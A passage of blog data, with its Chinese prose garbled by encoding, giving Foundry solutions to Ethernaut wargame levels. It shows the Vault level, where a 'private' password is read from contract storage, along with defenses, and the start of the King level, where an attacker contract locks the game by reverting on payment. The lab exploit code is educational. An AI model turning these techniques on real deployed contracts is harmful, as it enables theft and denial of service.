id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>private</code> å…³é”®å­—æ„å‘³ç€æ•°æ®åªèƒ½ç”±åˆçº¦æœ¬èº«è®¿é—®ï¼Œè€Œä¸æ˜¯å¯¹å¤–ç•Œéšè—</li>\n<li>åŒºå—é“¾ä¸Šæ²¡æœ‰ä»€ä¹ˆæ˜¯ç§æœ‰çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»</li>\n<li>EVM å­˜å‚¨ä½¿ç”¨ 32 å­—èŠ‚çš„æ’æ§½ç³»ç»Ÿ</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>ç›´æ¥è¯»å–åˆçº¦å­˜å‚¨</li>\n<li>åˆ†æå­˜å‚¨å¸ƒå±€ç¡®å®šæ•æ„Ÿæ•°æ®ä½ç½®</li>\n<li>ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®</li>\n<li>ä½¿ç”¨å“ˆå¸Œå’Œæ‰¿è¯ºæ–¹æ¡ˆ</li>\n<li>è€ƒè™‘é“¾ä¸‹éªŒè¯æœºåˆ¶</li>\n<li>å®æ–½é€‚å½“çš„è®¿é—®æ§åˆ¶</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">ä¸Šä¸€å…³: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">ä¸‹ä¸€å…³: Level 9 - King</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–\"><a href=\"#ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–\"></a>ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/8\">Ethernaut Level 8 - Vault</a><br><strong>æ”»å‡»ç±»å‹</strong>: ç§æœ‰å˜é‡è¯»å–<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¦ unlock è¿™ä¸ªåˆçº¦è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾åˆ° passwordã€‚æŒ‘æˆ˜çš„å…³é”®åœ¨äºç†è§£åŒºå—é“¾ä¸Šæ²¡æœ‰çœŸæ­£çš„â€ç§æœ‰â€æ•°æ®ï¼Œæ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å¯ä»¥è¢«è¯»å–ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg\" alt=\"Vault Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"å­˜å‚¨æœºåˆ¶-Storage\"><a href=\"#å­˜å‚¨æœºåˆ¶-Storage\" class=\"headerlink\" title=\"å­˜å‚¨æœºåˆ¶ (Storage)\"></a>å­˜å‚¨æœºåˆ¶ (Storage)</h3><p>æˆ‘ä»¬éœ€è¦ç†è§£ EVM ä¸­å­˜å‚¨çš„å¸ƒå±€ä»¥åŠåŸç†ï¼ˆä½¿ç”¨ 32 å­—èŠ‚å¤§å°çš„æ’æ§½ï¼‰å’Œ JSON RPC å‡½æ•° <code>eth_getStorageAt</code>ã€‚</p>\n<p>EVM çš„æ•°æ®éƒ½å­˜åœ¨ 32 å­—èŠ‚æ§½ä¸­ï¼š</p>\n<ul>\n<li>ç¬¬ä¸€ä¸ªçŠ¶æ€å˜é‡å­˜å‚¨åœ¨æ§½ä½ 0</li>\n<li>å¦‚æœç¬¬ä¸€ä¸ªå˜é‡å­˜å‚¨å®Œäº†è¿˜æœ‰è¶³å¤Ÿçš„å­—èŠ‚ï¼Œä¸‹ä¸€ä¸ªå˜é‡ä¹Ÿå­˜å‚¨åœ¨ slot 0</li>\n<li>å¦åˆ™å­˜å‚¨åœ¨ slot 1ï¼Œä¾æ­¤ç±»æ¨</li>\n</ul>\n<blockquote>\n<p><strong>æ³¨æ„</strong>: åƒæ•°ç»„å’Œå­—ç¬¦ä¸²è¿™æ ·çš„åŠ¨æ€ç±»å‹å·¥ä½œæ–¹å¼ä¸åŒ</p>\n</blockquote>\n<p>åœ¨ Vault åˆçº¦ä¸­ï¼š</p>\n<ul>\n<li><code>locked</code> æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä½¿ç”¨ 1 å­—èŠ‚ï¼Œå­˜å‚¨åœ¨ slot 0</li>\n<li><code>password</code> æ˜¯ä¸€ä¸ª bytes32ï¼Œä½¿ç”¨ 32 ä¸ªå­—èŠ‚</li>\n<li>ç”±äºæ’æ§½ 0 ä¸­å‰©ä½™çš„ 31 ä¸ªå­—èŠ‚æ— æ³•å®¹çº³ passwordï¼Œå› æ­¤å®ƒè¢«å­˜å‚¨åœ¨ slot 1 ä¸­</li>\n</ul>\n<h3 id=\"è¯»å–-Storage\"><a href=\"#è¯»å–-Storage\" class=\"headerlink\" title=\"è¯»å– Storage\"></a>è¯»å– Storage</h3><p><code>eth_getStorageAt</code> JSON RPC å‡½æ•°å¯ç”¨äºè¯»å–åˆçº¦åœ¨ç»™å®šæ§½ä½çš„å­˜å‚¨ã€‚</p>\n<p>ä½¿ç”¨ web3.js è¯»å– slot 1 çš„åˆçº¦å­˜å‚¨ï¼š</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddress, <span class=\"number\">1</span>, <span class=\"function\">(<span class=\"params\">err, result</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ Foundry ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ cheatcodes ä¸­çš„ loadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract VaultTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    VaultFactory vaultFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        vaultFactory = new VaultFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(vaultFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testVaultExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class=\"line\">        Vault instance = Vault(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»ï¼šè¯»å–å­˜å‚¨åœ¨ slot 1 ä¸­çš„å¯†ç </span><br><span class=\"line\">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨è¯»å–çš„å¯†ç è§£é”</span><br><span class=\"line\">        instance.unlock(password);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå­˜å‚¨å¸ƒå±€</strong>ï¼šç¡®å®š password å­˜å‚¨åœ¨ slot 1</li>\n<li><strong>è¯»å–å­˜å‚¨</strong>ï¼šä½¿ç”¨ <code>vm.load()</code> è¯»å– slot 1 çš„æ•°æ®</li>\n<li><strong>è°ƒç”¨ unlock</strong>ï¼šä½¿ç”¨è¯»å–çš„å¯†ç è§£é”åˆçº¦</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// è¯»å– slot 1 ä¸­çš„å¯†ç </span><br><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\"></span><br><span class=\"line\">// è§£é”åˆçº¦</span><br><span class=\"line\">instance.unlock(password);</span><br><span class=\"line\"></span><br><span class=\"line\">// éªŒè¯è§£é”æˆåŠŸ</span><br><span class=\"line\">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"><a href=\"#1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\" class=\"headerlink\" title=\"1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"></a>1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šå¯†ç å­˜å‚¨åœ¨é“¾ä¸Š</span><br><span class=\"line\">contract VulnerableVault &#123;</span><br><span class=\"line\">    bytes32 private password;  // å¯ä»¥è¢«è¯»å–ï¼</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _password) &#123;</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯</span><br><span class=\"line\">contract SecureVault &#123;</span><br><span class=\"line\">    bytes32 private passwordHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _passwordHash) &#123;</span><br><span class=\"line\">        passwordHash = _passwordHash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(string memory _password) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealVault &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ</span><br><span class=\"line\">    function commit(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _commitment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯</span><br><span class=\"line\">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨é“¾ä¸‹éªŒè¯\"><a href=\"#3-ä½¿ç”¨é“¾ä¸‹éªŒè¯\" class=\"headerlink\" title=\"3. ä½¿ç”¨é“¾ä¸‹éªŒè¯\"></a>3. ä½¿ç”¨é“¾ä¸‹éªŒè¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract OffChainVault &#123;</span><br><span class=\"line\">    address private authorizedSigner;</span><br><span class=\"line\">    mapping(address =&gt; bool) private unlocked;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class=\"line\">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class=\"line\">        address signer = recoverSigner(messageHash, signature);</span><br><span class=\"line\">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class=\"line\">        unlocked[user] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"å­˜å‚¨è¯»å–å·¥å…·\"><a href=\"#å­˜å‚¨è¯»å–å·¥å…·\" class=\"headerlink\" title=\"å­˜å‚¨è¯»å–å·¥å…·\"></a>å­˜å‚¨è¯»å–å·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ cast è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ web3.py</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>å­˜å‚¨å¸ƒå±€åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>private</code> å…³é”®å­—æ„å‘³ç€æ•°æ®åªèƒ½ç”±åˆçº¦æœ¬èº«è®¿é—®ï¼Œè€Œä¸æ˜¯å¯¹å¤–ç•Œéšè—</li>\n<li>åŒºå—é“¾ä¸Šæ²¡æœ‰ä»€ä¹ˆæ˜¯ç§æœ‰çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»</li>\n<li>EVM å­˜å‚¨ä½¿ç”¨ 32 å­—èŠ‚çš„æ’æ§½ç³»ç»Ÿ</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>ç›´æ¥è¯»å–åˆçº¦å­˜å‚¨</li>\n<li>åˆ†æå­˜å‚¨å¸ƒå±€ç¡®å®šæ•æ„Ÿæ•°æ®ä½ç½®</li>\n<li>ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®</li>\n<li>ä½¿ç”¨å“ˆå¸Œå’Œæ‰¿è¯ºæ–¹æ¡ˆ</li>\n<li>è€ƒè™‘é“¾ä¸‹éªŒè¯æœºåˆ¶</li>\n<li>å®æ–½é€‚å½“çš„è®¿é—®æ§åˆ¶</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">ä¸Šä¸€å…³: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">ä¸‹ä¸€å…³: Level 9 - King</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»","date":"2025-01-25T07:35:00.000Z","updated":"2025-01-25T07:35:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ æ‹’ç»æœåŠ¡æ”»å‡»å’Œå¤–éƒ¨è°ƒç”¨å®‰å…¨ï¼ŒæŒæ¡ King å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£ transferã€send å’Œ call çš„åŒºåˆ«åŠå®‰å…¨é£é™©ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 9 - King](https://ethernaut.openzeppelin.com/level/9)  \n> **æ”»å‡»ç±»å‹**: æ‹’ç»æœåŠ¡æ”»å‡» (DoS)  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè°å‡ºèµ„æ›´é«˜çš„æ—¶å€™ï¼Œè°å°±æˆä¸º kingï¼Œç›®æ ‡æ˜¯è®©è‡ªå·±æˆä¸º king ä¹‹åï¼Œåˆ«äººæ— æ³•å¤ºå–ç‹ä½ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»æˆä¸ºç‹è€…å¹¶ä¸€ç›´ä¿æŒå›½ç‹ï¼Œç„¶åæ‰“ç ´æ¸¸æˆã€‚\n\n![King Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### transfer() å‡½æ•°çš„ç‰¹æ€§\n\næˆ‘ä»¬éœ€è¦ç†è§£ `transfer`ï¼ˆç°åœ¨åŸºæœ¬è¢«å¼ƒç”¨ï¼‰æ˜¯å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œçš„ï¼š\n- å¦‚æœ `transfer` å¤±è´¥ï¼Œæ­¤å‡½æ•°æŠ›å‡ºé”™è¯¯ï¼Œä½†ä¸è¿”å›å¸ƒå°”å€¼\n- è¿™æ„å‘³ç€å¦‚æœ `transfer` å¤±è´¥ï¼Œäº¤æ˜“å°†æ¢å¤\n- Gas é™åˆ¶ä¸º 2300ï¼Œä¸è¶³ä»¥æ‰§è¡Œå¤æ‚é€»è¾‘\n\n### å…³é”®æ¼æ´ä»£ç \n\n```solidity\nreceive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);  // æ˜“å—æ”»å‡»çš„ç‚¹\n    king = msg.sender;\n    prize = msg.value;\n}\n```\n\n### æ”»å‡»å‘é‡\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨ `transfer()` å‡½æ•°å¤±è´¥æ—¶ä¼šå›æ»šçš„ç‰¹æ€§ï¼š\n1. éƒ¨ç½²ä¸€ä¸ªåˆçº¦æˆä¸º king\n2. åˆçº¦ä¸å®šä¹‰ `receive()` æˆ– `fallback()` å‡½æ•°\n3. æˆ–è€…åœ¨ `receive()` å‡½æ•°ä¸­ç›´æ¥ revert\n4. è¿™æ ·åˆçº¦å°†æ— æ³•æ¥æ”¶ ETHï¼Œé˜»æ­¢ä»»ä½•äººæˆä¸ºæ–°çš„ king\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/KingFactory.sol\";\n\ncontract KingAttacker {\n    King instance;\n\n    constructor(address payable _king) payable {\n        instance = King(_king);\n    }\n\n    function attack() public payable {\n        (bool success, ) = address(instance).call{value: msg.value}(\"\");\n        require(success, \"Attack failed\");\n    }\n\n    // å…³é”®ï¼šæ‹’ç»æ¥æ”¶ ETH\n    receive() external payable {\n        revert(\"I will always be the king!\");\n    }\n}\n\ncontract KingTest is Test {\n    Ethernaut ethernaut;\n    KingFactory kingFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        kingFactory = new KingFactory();\n        ethernaut.registerLevel(kingFactory);\n    }\n    \n    function testKingExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address payable levelInstance = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));\n        King instance = King(levelInstance);\n        \n        // æ£€æŸ¥åˆå§‹çŠ¶æ€\n        uint256 initialPrize = instance.prize();\n        address initialKing = instance._king();\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n        \n        // æ‰§è¡Œæ”»å‡»ï¼šæˆä¸º king\n        attacker.attack{value: initialPrize + 1}();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance._king(), address(attacker));\n        \n        // å°è¯•æœ‰äººè¶…è¶Šæˆ‘ä»¬ï¼ˆåº”è¯¥å¤±è´¥ï¼‰\n        vm.expectRevert();\n        (bool success, ) = levelInstance.call{value: initialPrize + 2}(\"\");\n        